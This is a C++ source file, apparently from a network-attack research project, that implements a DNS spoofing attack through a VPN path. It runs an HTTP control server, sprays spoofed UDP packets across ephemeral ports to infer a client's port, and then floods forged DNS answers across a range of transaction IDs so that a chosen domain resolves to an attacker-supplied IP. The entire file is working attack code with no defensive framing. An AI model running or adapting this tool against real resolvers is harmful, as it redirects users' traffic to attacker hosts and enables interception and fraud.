#include <cstdlib>
#include <iostream>
#include <string>
#include <sys/time.h>
#include <vector>
#include <unistd.h>

#include <tins/tins.h>

#include "../TCP-hijacking/httplib.h"

using namespace httplib;
using namespace std;
using namespace Tins;

namespace {
const uint16_t kStartPort = 32768;
const uint16_t kEndPort = 65530;
const int kPortSearchRange = 2000;
const char kVerifyPayload[] = "dns-verify";
const size_t kTrackedPortCount = 40000;
}  // namespace

IPv4Address remote_dns_ip, vpn_wan_ip;
uint16_t spoof_server_port;
uint16_t remote_dns_port;
string packet_iface;
IP verify_pkts[kTrackedPortCount];

double __get_us(struct timeval t) {
    return (t.tv_sec * 1000000 + t.tv_usec);
}

void sendLinearResponse(uint16_t begin_port) {
    PacketSender sender;
    NetworkInterface iface(packet_iface);

    const uint16_t max_port =
        (begin_port + kPortSearchRange) < kEndPort ? begin_port + kPortSearchRange
                                                   : kEndPort;
    struct timeval start_time, stop_time;
    gettimeofday(&start_time, NULL);
    for (uint16_t port = begin_port; port < max_port; port++) {
        sender.send(verify_pkts[port - kStartPort], iface);
        usleep(10);
    }
    gettimeofday(&stop_time, NULL);
    cout << "send UDP verify packets time: "
         << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;
}

vector<uint16_t> stringSplit(const string& str, char delim) {
    size_t previous = 0;
    size_t current = str.find(delim);
    vector<uint16_t> elems;
    while (current != string::npos) {
        if (current > previous) {
            elems.push_back(atoi(str.substr(previous, current - previous).c_str()));
        }
        previous = current + 1;
        current = str.find(delim, previous);
    }
    if (previous != str.size()) {
        elems.push_back(atoi(str.substr(previous).c_str()));
    }
    return elems;
}

void sendSpecificResponse(uint16_t base_port, const vector<uint16_t>& all_increment) {
    PacketSender sender;
    NetworkInterface iface(packet_iface);

    uint16_t cur_port = base_port;
    for (size_t i = 0; i < all_increment.size(); ++i) {
        cur_port += all_increment[i];
        sender.send(verify_pkts[cur_port - kStartPort], iface);
        usleep(10);
    }
}

string normalize_domain_name(string domain_name) {
    while (!domain_name.empty() && domain_name.back() == '.') {
        domain_name.pop_back();
    }
    return domain_name;
}

DNS build_dns_response(const string& domain_name,
                       const string& forged_ip,
                       uint32_t dns_ttl,
                       uint16_t txid) {
    DNS dns;
    dns.id(txid);
    dns.type(DNS::RESPONSE);
    dns.authoritative_answer(1);
    dns.recursion_desired(1);
    dns.recursion_available(1);
    dns.add_query(DNS::query(domain_name, DNS::A, DNS::INTERNET));
    dns.add_answer(
        DNS::resource(domain_name, forged_ip, DNS::A, DNS::INTERNET, dns_ttl));
    return dns;
}

void sendDNSResponses(uint16_t guessed_client_port,
                      const string& raw_domain_name,
                      const string& forged_ip,
                      uint32_t dns_ttl,
                      uint16_t txid_begin,
                      uint16_t txid_end) {
    string domain_name = normalize_domain_name(raw_domain_name);
    if (domain_name.empty()) {
        cout << "domain_name is empty" << endl;
        return;
    }

    if (txid_begin > txid_end) {
        std::swap(txid_begin, txid_end);
    }

    PacketSender sender;
    NetworkInterface iface(packet_iface);

    IP dns_pkt =
        IP(vpn_wan_ip, remote_dns_ip) /
        UDP(guessed_client_port, remote_dns_port) /
        build_dns_response(domain_name, forged_ip, dns_ttl, txid_begin);
    dns_pkt.rfind_pdu<IP>().ttl(64);
    DNS& dns = dns_pkt.rfind_pdu<DNS>();

    struct timeval start_time, stop_time;
    gettimeofday(&start_time, NULL);
    for (uint32_t txid = txid_begin; txid <= txid_end; ++txid) {
        dns.id(txid);
        sender.send(dns_pkt, iface);
        if ((txid - txid_begin) % 10000 == 0) {
            cout << "sent DNS response with txid " << txid << endl;
        }
        if (txid == txid_end) {
            break;
        }
    }
    gettimeofday(&stop_time, NULL);
    cout << "send spoofed DNS responses time: "
         << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;
}

int main(int argc, char** argv) {
    if (argc != 6) {
        cout << "wrong number of args ---> "
             << "(remote_dns_ip, remote_dns_port, vpn_wan_ip, spoof_server_port, "
             << "packet_iface)" << endl;
        return 0;
    }

    remote_dns_ip = IPv4Address(argv[1]);
    remote_dns_port = atoi(argv[2]);
    vpn_wan_ip = IPv4Address(argv[3]);
    spoof_server_port = atoi(argv[4]);
    packet_iface = argv[5];

    for (int i = 0; i < kEndPort - kStartPort; i++) {
        verify_pkts[i] = IP(vpn_wan_ip, remote_dns_ip) /
                         UDP(kStartPort + i, remote_dns_port) /
                         RawPDU(string(kVerifyPayload));
        verify_pkts[i].rfind_pdu<IP>().ttl(64);
    }

    Server svr;
    svr.Get(R"(/begin_port/(\d+))", [&](const Request& req, Response& res) {
        const uint16_t begin_port = atoi(string(req.matches[1]).c_str());
        cout << "begin_port: " << begin_port << endl;
        sendLinearResponse(begin_port);
        res.set_content("send linear UDP verify packets done!", "text/plain");
    });

    svr.Post("/possible_ports", [&](const Request& req, Response& res) {
        const uint16_t base_port =
            atoi(req.get_param_value("base_port").c_str());
        const vector<uint16_t> ports =
            stringSplit(req.get_param_value("all_increment"), ',');
        cout << "all_increment: " << ports.size() << endl;
        sendSpecificResponse(base_port, ports);
        res.set_content("send targeted UDP verify packets done!", "text/plain");
    });

    svr.Post("/send_dns_responses", [&](const Request& req, Response& res) {
        const uint16_t guessed_client_port =
            atoi(req.get_param_value("guessed_client_port").c_str());
        const string domain_name = req.get_param_value("domain_name");
        const string forged_ip = req.get_param_value("forged_ip");
        const uint32_t dns_ttl =
            strtoul(req.get_param_value("dns_ttl").c_str(), NULL, 10);
        const uint16_t txid_begin =
            strtoul(req.get_param_value("txid_begin").c_str(), NULL, 10);
        const uint16_t txid_end =
            strtoul(req.get_param_value("txid_end").c_str(), NULL, 10);

        cout << "post: send_dns_responses, guessed_client_port: "
             << guessed_client_port << ", domain_name: " << domain_name
             << ", forged_ip: " << forged_ip << ", txid range: " << txid_begin
             << "-" << txid_end << endl;
        sendDNSResponses(guessed_client_port, domain_name, forged_ip, dns_ttl,
                         txid_begin, txid_end);
        res.set_content("send spoofed DNS responses done!", "text/plain");
    });

    svr.Get("/stop", [&](const Request& req, Response& res) { svr.stop(); });
    svr.set_keep_alive_max_count(10);
    svr.set_keep_alive_timeout(1000);
    svr.set_read_timeout(10, 0);
    svr.set_write_timeout(120, 0);
    svr.listen("0.0.0.0", spoof_server_port);
}
